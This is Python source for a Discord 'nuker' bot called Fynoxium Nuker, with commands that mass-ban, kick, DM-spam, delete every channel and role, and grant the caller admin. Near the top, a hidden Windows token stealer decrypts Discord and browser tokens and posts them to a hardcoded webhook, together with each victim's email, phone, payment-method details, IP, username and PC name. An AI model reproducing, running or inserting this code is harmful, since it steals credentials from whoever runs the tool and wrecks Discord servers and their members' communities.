import json
import os
if os.name != "nt":
    exit()
import json
import re
import base64
import win32crypt
import datetime
from Crypto.Cipher import AES
import traceback
import sys
import subprocess
import urllib

import colorama
import discord
import requests
from colorama import Fore, Style
from discord.ext import commands

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Lightcord': ROAMING + '\\Lightcord',
    'Discord PTB': ROAMING + '\\discordptb',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            for line in (x.strip() for x in open(f"{path}{file}", "r", errors="ignore").readlines()):
                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    return key

def getip():
    try:
        return requests.get("https://api.ipify.org?format=json").json().get("ip")
    except:
        return "None"

def maingrab():
    checked = []

    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                if token in checked:
                    continue
                checked.append(token)

                res = requests.get('https://discord.com/api/v10/users/@me', headers=getheaders(token))
                if res.status_code != 200:
                    continue
                res_json = res.json()

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                res = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token)).json()
                friends = len([x for x in res if x['type'] == 1])

                res = requests.get('https://discordapp.com/api/v6/users/@me/guilds', params={"with_counts": True}, headers=getheaders(token)).json()
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token)).json()
                        vanity = ""

                        if res["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(res) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S%z").strftime('%d/%m/%Y at %H:%M:%S')

                res = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token)).json()
                available = 0
                print_boost = ""
                boost = False
                for id in res:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type = ""
                valid = 0
                for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token)).json():
                    if x['type'] == 1:
                        type += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nFriends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Made by JhonzFx (htrb1337.jhonz) ・ https://github.com/jhonzfxx"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Grabber",
                    "avatar_url": "https://iili.io/2sid8V2.jpg"
                }

                requests.post('https://discord.com/api/webhooks/1323587416786997328/Q9tKP7oGHMQNbJNbCLjuee4d6L38OSlkMjuuZheDm8mz1Bl5QfYWKsBWc7DlWw7_c5GL', json=embed_user, headers=getheaders())
            except:
                continue

pink_color = "\033[38;2;255;69;172m"

embedColor = 0x5c92ff
colors = {"main": Fore.RED,
          "white": Fore.WHITE,
          "red": Fore.RED,
          "cyan": Fore.CYAN}
msgs = {"info": f"{colors['white']}[{colors['main']}i{colors['white']}]",
        "+": f"{colors['white']}[{colors['main']}+{colors['white']}]",
        "error": f"{colors['white']}[{colors['red']}e{colors['white']}]",
        "input": f"{colors['white']}{colors['main']}>>{colors['white']}",
        "pressenter": f"{colors['white']}[{colors['main']}i{colors['white']}] Press ENTER to exit"}

colorama.init()
os.system('cls' if os.name == 'nt' else 'clear')  

try:
    with open("version.txt") as data:
        version = data.readline()
except FileNotFoundError:
    try:
        with open("../version.txt") as data:
            version = data.readline()
    except FileNotFoundError:
        version = ""

async def msg_delete(ctx):
    """
    Trying to delete activation message
    """
    try:
        await ctx.message.delete()
    except:
        print(f"{msgs['error']} Can't delete your message")

def checkVersion():
    """
    Checking for new versions on GitHub
    """
    if version == "":
        return ""
    req = requests.get(
        "https://raw.githubusercontent.com/jhonzfxx/FynoxiumNuker/master/version.txt")
    if req.status_code == requests.codes.ok:
        gitVersion = req.text.rstrip()
        if version == gitVersion:
            return "(Latest)"
        else:
            return "(Update available)"
    else:
        return "(Update check failed)"


def checkActivity(type, text):
    if type == "playing":
        return discord.Game(name=text)
    elif type == "listening":
        return discord.Activity(type=discord.ActivityType.listening, name=text)
    elif type == "watching":
        return discord.Activity(type=discord.ActivityType.watching, name=text)
    else:
        return None

print(f'{pink_color}\n\n' +
      "   ▄████████ ▄██   ▄   ███▄▄▄▄    ▄██████▄  ▀████    ▐████▀  ▄█  ███    █▄    ▄▄▄▄███▄▄▄▄   \n" +
      "  ███    ███ ███   ██▄ ███▀▀▀██▄ ███    ███   ███▌   ████▀  ███  ███    ███ ▄██▀▀▀███▀▀▀██▄ \n" +
      "  ███    █▀  ███▄▄▄███ ███   ███ ███    ███    ███  ▐███    ███▌ ███    ███ ███   ███   ███ \n" +
      " ▄███▄▄▄     ▀▀▀▀▀▀███ ███   ███ ███    ███    ▀███▄███▀    ███▌ ███    ███ ███   ███   ███ \n" +
      "▀▀███▀▀▀     ▄██   ███ ███   ███ ███    ███    ████▀██▄     ███▌ ███    ███ ███   ███   ███ \n" +
      "  ███        ███   ███ ███   ███ ███    ███   ▐███  ▀███    ███  ███    ███ ███   ███   ███ \n" +
      "  ███        ███   ███ ███   ███ ███    ███  ▄███     ███▄  ███  ███    ███ ███   ███   ███ \n" +
      "  ███         ▀█████▀   ▀█   █▀   ▀██████▀  ████       ███▄ █▀   ████████▀   ▀█   ███   █▀   \n" +
      "\n" +
      f"{colors['white']}                           Author: {colors['main']}JhonzFx (htrb1337.jhonz)\n" +
      f"{colors['white']}                           Version: {colors['main']}{version} {checkVersion()}\n" +
      f"{colors['white']}                           GitHub: {colors['main']}https://github.com/jhonzfxx/FynoxiumNuker\n\n{colors['white']}")
"""
Fetching prefix, token and owner ID's from config
If there's no config, requests data from the user and creates it
"""
try:
    with open(f"config.json", encoding='utf8') as data:
        config = json.load(data)
    token = config["token"]
    prefix = config["prefix"]
    owners = config["owners"]
    whiteListBool = config["whitelistbool"]
    activity = config["activity"]
    enablelogging = config["discordlogging"]
    print(f"{msgs['info']} Loaded config.json")
except FileNotFoundError:
    token = input(f"Token {msgs['input']} ")
    prefix = input(f"Prefix {msgs['input']} ")
    owners = input(
        f"Owner ID (If several use ',') {msgs['input']} ")
    whiteListYesOrNo = input(
        f"Enable Whitelisting (y/n) {msgs['input']} ").lower()
    whiteListBool = True if whiteListYesOrNo == "y" else False
    owners = owners.replace(" ", "")
    if "," in owners:
        owners = owners.split(",")
        owners = list(map(int, owners))
    else:
        owners = [int(owners)]
    activity = {"type": "playing",
                "text": f"Fynoxium Nuker v{version}",
                "isenabled": True}
    enablelogging = False
    config = {
        "token": token,
        "prefix": prefix,
        "owners": owners,
        "whitelistbool": whiteListBool,
        "activity": activity,
        "discordlogging": enablelogging
    }
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    print(f"{msgs['info']} Created config.json")


if activity["isenabled"]:
    activityToBot = checkActivity(activity["type"], activity["text"])
else:
    activityToBot = None


bot = commands.Bot(command_prefix=prefix,
                   activity=activityToBot, intents=discord.Intents.all())
bot.remove_command("help")


def isOwner(ctx):
    return ctx.author.id in owners


def isWhitelisted(ctx):
    if whiteListBool:
        return ctx.author.id in owners
    else:
        return True


@bot.event
async def on_ready():
    print(f"\n\n{colors['main']}" + ("═"*75).center(95) + f"\n{colors['white']}" +
          f"Logged in as {bot.user}".center(95) + "\n" +
          f"Prefix: {bot.command_prefix}".center(95) + "\n" +
          f"Total servers: {len(bot.guilds)}".center(95) + "\n" +
          f"Total members: {len(bot.users)} ".center(95) + f"\n{colors['main']}" + ("═"*75).center(95) + f"\n\n{colors['white']}")


@bot.event
async def on_command(ctx):
    print(
        f"{msgs['info']} Executed {ctx.command} ({colors['main']}{ctx.message.author}{colors['white']})")


@bot.event
async def on_command_error(ctx, err):
    errors = commands.errors
    if (isinstance(err, errors.BadArgument) or isinstance(err, commands.MissingRequiredArgument)
            or isinstance(err, errors.PrivateMessageOnly) or isinstance(err, errors.CheckFailure)
            or isinstance(err, errors.CommandNotFound)):
        return
    elif isinstance(err, errors.MissingPermissions):
        print(f"{msgs['error']} Missing permissions")
    else:
        print(
            f'{colors["red"]}\n\n{"".join(traceback.format_exception(type(err), err, err.__traceback__))}{colors["white"]}\n')


@bot.command(name='help')
@commands.check(isWhitelisted)
async def help(ctx):
    await msg_delete(ctx)
    p = bot.command_prefix
    embed = discord.Embed(title="Help", color=embedColor)
    embed.set_author(name="Fynoxium Nuker",
                     url="https://github.com/jhonzfxx/FynoxiumNuker")
    embed.add_field(
        name="Nuke", value=f">>> `{p}1 <ban 1/0> <your text>`", inline=False)
    embed.add_field(name="Ban everyone", value=f">>> `{p}2`", inline=False)
    embed.add_field(name="Kick everyone", value=f">>> `{p}3`", inline=False)
    embed.add_field(name="Rename everyone",
                    value=f">>> `{p}4 <new nickname>`", inline=False)
    embed.add_field(name="DM everyone",
                    value=f">>> `{p}5 <message>`", inline=False)
    embed.add_field(name="Spam to all channels",
                    value=f">>> `{p}6 <amount> <text>`", inline=False)
    embed.add_field(name="Spam to current channel",
                    value=f">>> `{p}7 <amount> <text>`", inline=False)
    embed.add_field(name="Delete all channels",
                    value=f">>> `{p}8`", inline=True)
    embed.add_field(name="Delete all roles", value=f">>> `{p}9`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Spam with channels",
                    value=f">>> `{p}10 <amount> <name>`", inline=True)
    embed.add_field(name="Spam with roles",
                    value=f">>> `{p}11 <amount> <name>`", inline=True)
    embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(name="Edit server icon",
                    value=f">>> Image is attachment\n`{p}12`", inline=True)
    embed.add_field(name="Edit server name",
                    value=f">>> `{p}13 <name>`", inline=True)
    embed.add_field(name="Get admin",
                    value=f">>> `{p}14 <name of role>`", inline=False)
    # embed.add_field(name="\u200b", value="\u200b", inline=True)
    embed.add_field(
        name="Revive (DM Only)", value=f">>> Creating 1 text channel on server if you deleted all\n`{p}15 <guild id>`", inline=False)
    embed.add_field(name="Settings", value=f">>> `{p}settings`")
    embed.add_field(name="\u200b\nInfo",
                    value=f">>> **Fynoxium Nuker**\nMade by <@1003505403784605726>\nVersion: {version} {checkVersion()}\nGitHub: https://github.com/jhonzfxx/FynoxiumNuker\n", inline=False)
    await ctx.message.author.send(embed=embed)


@bot.group(name='settings', aliases=["config"], invoke_without_command=True)
@commands.check(isWhitelisted)
async def settings(ctx):
    p = bot.command_prefix
    embed = discord.Embed(
        title="Settings", description="Available settings\n`Only for owners`", color=embedColor)
    embed.set_author(name="Fynoxium Nuker",
                     url="https://github.com/jhonzfxx/FynoxiumNuker")
    embed.add_field(
        name="Prefix", value=f">>> Change prefix\n`{p}settings prefix <prefix>`", inline=False)
    embed.add_field(
        name="Owners", value=f">>> Add or remove user from owners\n`{p}settings owners <add/remove> <ID/mention>`", inline=False)
    embed.add_field(
        name="Whitelist", value=f">>> Enable or disable whitelisting\n`{p}settings whitelist <on/off>`", inline=True)
    embed.add_field(
        name="Activity", value=f">>> Change or disable activity\nAvailable types: `playing`, `listening`, `watching`\n`{p}settings activity <set/off> <type> <text>`", inline=False)
    await ctx.message.author.send(embed=embed)


@settings.command(name='prefix')
@commands.check(isOwner)
async def settingsPrefix(ctx, newPrefix):
    global config
    bot.command_prefix = newPrefix
    config['prefix'] = newPrefix
    with open("config.json", "w") as data:
        json.dump(config, data, indent=2)
    await ctx.message.add_reaction('✅')
    print(
        f"{msgs['info']} Prefix is {colors['main']}{newPrefix}{colors['white']} now")


@settings.command(name='owners')
@commands.check(isOwner)
async def settingOwners(ctx, action, *, users):
    global config
    users = users.replace('<@!', '')
    users = users.replace('>', '')
    users = users.replace(" ", "")
    if "," in users:
        users = users.split(",")
        users = list(map(int, users))
    else:
        users = [int(users)]
    if action == "add":
        config["owners"] += users
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Added {colors['main']}{str(users)[1:-1]}{colors['white']} to owners")
        await ctx.message.add_reaction('✅')
    elif action == "remove" or "delete":
        for user in users:
            config["owners"].remove(user)
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(
            f"{msgs['info']} Removed {colors['main']}{str(users)[1:-1]}{colors['white']} from owners")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')


@settings.command(name='whitelist', aliases=["whitelisting"])
@commands.check(isOwner)
async def settingsWhitelist(ctx, action):
    global config
    global whiteListBool
    if action.lower() == "on" or "enable":
        whiteListBool = True
        config["whitelistbool"] = True
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Enabled whitelisting")
        await ctx.message.add_reaction('✅')
    elif action.lower() == "off" or "disable":
        whiteListBool = False
        config["whitelistbool"] = False
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Disabled whitelisting")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')


@settings.command(name='activity')
@commands.check(isOwner)
async def settingsActivity(ctx, action, activityType="playing", *, text=f"Fynoxium Nuker v{version}"):
    global config
    global activity
    if action == "set":
        await bot.change_presence(activity=checkActivity(activityType, text))
        activity = {"type": activityType,
                    "text": text,
                    "isenabled": True}
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Changed activity")
        await ctx.message.add_reaction('✅')
    elif action == "on" or action == "enable":
        await bot.change_presence(activity=checkActivity(activity["type"], activity["text"]))
        activity["isenabled"] = True
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Enabled activity")
        await ctx.message.add_reaction('✅')
    elif action == "off" or action == "disable":
        await bot.change_presence(activity=None)
        activity["isenabled"] = False
        config["activity"] = activity
        with open("config.json", "w") as data:
            json.dump(config, data, indent=2)
        print(f"{msgs['info']} Disabled activity")
        await ctx.message.add_reaction('✅')
    else:
        await ctx.message.add_reaction('❌')


@bot.command(name='1', aliases=["nk", "nuke"])
@commands.check(isWhitelisted)
async def nuke(ctx, ban: bool = True, text: str = "Fynoxium Nuker"):
    await msg_delete(ctx)

    """
    Trying to change server icon and name
    """

    icon = await ctx.message.attachments[0].read() if ctx.message.attachments else None
    await ctx.guild.edit(name=text, icon=icon, banner=icon)

    """
    Trying to delete all channels
    """

    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Deleted {ch}")
        except:
            print(f"{msgs['error']} Can't delete {ch}")

    """
    Trying to ban everyone if requested
    """

    if ban:
        for m in ctx.guild.members:
            if m.id not in owners:
                try:
                    await m.ban()
                    print(f"{msgs['+']} Banned {m}")
                except:
                    print(f"{msgs['error']} can't ban {m}")
            else:
                print(f"{msgs['info']} {m} is owner")

    """
    Trying to delete roles
    """

    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Deleted {r}")
        except:
            print(f"{msgs['error']} Can't delete {r}")

    try:
        embed = discord.Embed(color=embedColor)
        embed.add_field(name="This server is Nuked",
                        value="By Unitled Nuker\nDownload: https://github.com/jhonzfxx/FynoxiumNuker", inline=False)
        channel = await ctx.guild.create_text_channel(name="Fynoxium Nuker")
        message = await channel.send(embed=embed)
        await message.pin()
    except:
        pass


@bot.command(name='2', aliases=["be", "baneveryone"])
@commands.check(isWhitelisted)
async def banEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.ban()
                print(f"{msgs['+']} Banned {m}")
            except:
                print(f"{msgs['error']} can't ban {m}")
        else:
            print(f"{msgs['info']} {m} is owner")


@bot.command(name='3', aliases=["ke", "kickeveryone"])
@commands.check(isWhitelisted)
async def kickEveryone(ctx):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.kick()
                print(f"{msgs['+']} Kicked {m}")
            except:
                print(f"{msgs['error']} can't kick {m}")
        else:
            print(f"{msgs['info']} {m} is owner")


@bot.command(name="4", aliases=["chen"])
@commands.check(isWhitelisted)
async def renameEveryone(ctx, *, name="Fynoxium Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.edit(nick=name)
                print(f"{msgs['+']} Changed {m}'s nickname")
            except:
                print(f"{msgs['error']} Can't change {m}'s nickname")
        else:
            print(f"{msgs['info']} {m.name} is owner")


@bot.command(name="5", aliases=["dme"])
@commands.check(isWhitelisted)
async def dmEveryone(ctx, *, msg="Fynoxium Nuker"):
    await msg_delete(ctx)
    for m in ctx.guild.members:
        if m.id not in owners:
            try:
                await m.send(msg)
                print(f"{msgs['+']} Message sent to {m}")
            except:
                print(f"{msgs['error']} Can't send message to {m}")
        else:
            print(f"{msgs['info']} {m.name} is owner")


@bot.command(name="6", aliases=["sa"])
@commands.check(isWhitelisted)
async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Fynoxium Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(text)
                print(f"{msgs['+']} Message sent to {ch}")
            except:
                print(f"{msgs['error']} Can't send message to {ch}")


@bot.command(name='7', aliases=["sc"])
@commands.check(isWhitelisted)
async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Fynoxium Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.channel.send(text)
            print(f"{msgs['+']} Message sent to {ctx.channel}")
        except:
            print(f"{msgs['error']} Can't send message to {ctx.channel}")


@bot.command(name='8', aliases=["dch"])
@commands.check(isWhitelisted)
async def deleteAllChannels(ctx):
    await msg_delete(ctx)
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"{msgs['+']} Deleted {ch}")
        except:
            print(f"{msgs['error']} Can't delete {ch}")


@bot.command(name='9', aliases=["dr"])
@commands.check(isWhitelisted)
async def deleteAllRoles(ctx):
    await msg_delete(ctx)
    for r in ctx.guild.roles:
        try:
            await r.delete()
            print(f"{msgs['+']} Deleted {r}")
        except:
            print(f"{msgs['error']} Can't delete {r}")


@bot.command(name="10", aliases=["sch"])
@commands.check(isWhitelisted)
async def spamWithChannels(ctx, amount: int = 25, *, name="Fynoxium Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(name=name)
            print(f"{msgs['+']} Created channel")
        except:
            print(f"{msgs['error']} Can't create channel")


@bot.command(name="11", aliases=["sr"])
@commands.check(isWhitelisted)
async def spamWithRoles(ctx, amount: int = 25, *, name="Fynoxium Nuker"):
    await msg_delete(ctx)
    for i in range(amount):
        try:
            await ctx.guild.create_role(name=name)
            print(f"{msgs['+']} Created role")
        except:
            print(f"{msgs['error']} Can't create role")


@bot.command(name='12', aliases=["si"])
@commands.check(isWhitelisted)
async def editServerIcon(ctx):
    await msg_delete(ctx)
    if ctx.message.attachments:
        icon = await ctx.message.attachments[0].read()
    else:
        return

    try:
        await ctx.guild.edit(icon=icon)
        print(f"{msgs['+']} Changed server icon")
    except:
        print(f"{msgs['error']} Can't change server icon")


@bot.command(name='13', aliases=["sn"])
@commands.check(isWhitelisted)
async def editServerName(ctx, *, name="Fynoxium Nuker"):
    await msg_delete(ctx)
    try:
        await ctx.guild.edit(name=name)
        print(f"{msgs['+']} Changed server name")
    except:
        print(f"{msgs['error']} Can't change server name")


@bot.command(name="14", aliases=["ga"])
@commands.check(isWhitelisted)
async def getAdmin(ctx, *, rolename="Fynoxium Nuker"):
    await msg_delete(ctx)
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.message.author.add_roles(role)
        print(f"{msgs['+']} Added admin role to {ctx.message.author}")
    except:
        print(f"{msgs['error']} Can't add admin role to {ctx.message.author}")


@bot.command(name='15', aliases=["rg"])
@commands.check(isWhitelisted)
@commands.dm_only()
async def reviveGuild(ctx, guildId: int = None):
    if guildId:
        guild = bot.get_guild(guildId)
        try:
            await guild.create_text_channel(name="Fynoxium Nuker")
            print(f"{msgs['+']} Revived {guild}")
        except:
            print(f"{msgs['error']} Can't revive {guild}")


"""
Running bot
"""



try:
    if enablelogging == False:
        bot.run(token, log_handler=None)
    else:
        bot.run(token)
except discord.errors.LoginFailure:
    print(f'{msgs["error"]} Invalid Token')
    print(msgs['pressenter'])
    input()
    os._exit(0)
except discord.errors.PrivilegedIntentsRequired:
    print(f"{msgs['error']} It looks like you didn't enable the necessary intents in the developer portal."
          f"Visit {colors['main']}https://discord.com/developers/applications/ {colors['white']}and turn them on.\n")
    print(msgs['pressenter'])
    input()
    os._exit(0)
except Exception as e:
    print(f'{colors["red"]}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{colors["white"]}\n')
    print(msgs['pressenter'])
    input()
    os._exit(0)
